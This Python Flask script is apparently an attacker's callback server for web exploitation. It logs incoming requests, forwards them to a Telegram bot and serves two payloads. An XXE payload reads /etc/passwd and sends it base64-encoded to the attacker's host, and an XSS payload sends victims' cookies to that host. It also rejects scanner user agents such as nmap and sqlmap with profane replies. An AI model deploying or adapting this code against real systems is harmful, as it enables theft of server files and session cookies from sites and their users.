# -*- coding: utf-8 -*-
from flask import Flask
from flask import render_template
from flask import request
from flask import make_response

import telegram
import json
import os

app = Flask(__name__)

########################## CONFIG #############################
ME = "" 
# ^ use you ip or server domain like esonhugh.me

xxe_remote_payload = f'''<!ENTITY % payl SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd"><!ENTITY % int "<!ENTITY &#x25; trick SYSTEM 'http://{ME}/?%payl;'>">
%int;%trick;'''
# ^ if you use the xxe func

xss_remote_payload = f"""var oReq = new XMLHttpRequest();oReq.open("GET", "http://{ME}/"+documnet.cookie);oReq.send();"""
# ^ if you use the xss func

blacklist = ["nmap","Nmap","NMAP","sqlmap","SQLMAP","vulnmap","VULNMAP"]


bot = telegram.Bot(token='1234567890:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA')    
# ^ there is your telegram bot token

My_chat_id=''
# ^ receiver id 

msgCodeFlag = True              
# ^ send the message as code in html

accessLogPassword=""            
# ^ the password to check the log

# Get log on internet method is 
# GET /check?pass=accessLogPassword&sendTG=1
# Both send to TG and you
# GET /check?pass=accessLogPassword
# Only send to you


def sendMe(msg,codeflag=msgCodeFlag):
    if (codeflag):
        bot.send_message(chat_id=My_chat_id,text="<code>"+msg+"</code>",parse_mode=telegram.ParseMode.HTML)
    else:
        bot.send_message(chat_id=My_chat_id,text=msg)

@app.before_request
def before_request():
    logfile = open("./log","a")
    log = {}
    log["ip"] = request.remote_addr
    log['method'] = request.method
    log['headers'] = str(request.headers).rstrip().replace("\r\n","\n")
    log['url']  = request.full_path
    log['form'] = request.stream.read().decode('UTF-8')
    logger = json.dumps(log)
    flag = 1
    for bad_ua in blacklist :
        if bad_ua in (request.headers["User-Agent"]) :
            flag = 0
    if flag == 0 :
        logger += "<bad_ua tag>"
    logger += "\n"
    print(logger)
    logfile.write(logger)
    logfile.close()
    if flag == 0 :
        return("FUCK you!!! scripting kid!!")
        
    # sendMe(logger)      
    # ^--about the sendMe func----------------------------------- 
    # Very Important : if you can't use the Telegram bot api with 
    # inside GxFxW area like China, you need keep it as comment!! 
    # repeat, what condition it will is all depends on your 
    # network ENV.

@app.route('/check',methods=['GET'])
def check():
    logfile = open("./log","r")
    returnlog = []
    for line in logfile:
        returnlog.append(line)
    feedback = "".join(returnlog)
    logfile.close()

    if ( request.args.get( "pass" ) ==  accessLogPassword ):
        if( request.args.get( "sendTG" ) == "1" ):
            sendMe(feedback)
        return(feedback)
    else:
        return("Permission Deny")

@app.route('/clean',methods=['DELETE'])
def clear():
    if(request.args.get("pass") == accessLogPassword):
        os.remove("./log")
        return("clear success")
    else:
        return("Permission deny")

@app.route('/xss')
def xss_log():
    print("XSS is called")
    print( xss_remote_payload )
    return( xss_remote_payload )

@app.route('/xxe')
def xxe_log():
    print("XXE is called")
    print( xxe_remote_payload )
    return( xxe_remote_payload )

# fuck the error cause by requester
@app.errorhandler(404)
def not_found(error):
    resp = make_response("accept but not found", 200)
    return resp
@app.errorhandler(400)
def fuckyou(error):
    resp = make_response("fuckyou bitch?",200)
    return resp
@app.errorhandler(500)
def fuckyouagain(error):
    resp = make_response("fuck you bitch!!!!!!",200)
    return resp

@app.after_request
def make_request(response):
    # print(dir(response.headers))
    # print(response.headers)
    response.headers['Server'] = "fuck boy"
    return response

if __name__ == '__main__':
    app.run(host='0.0.0.0',port=80) 
    # server should be run as root to listen the port
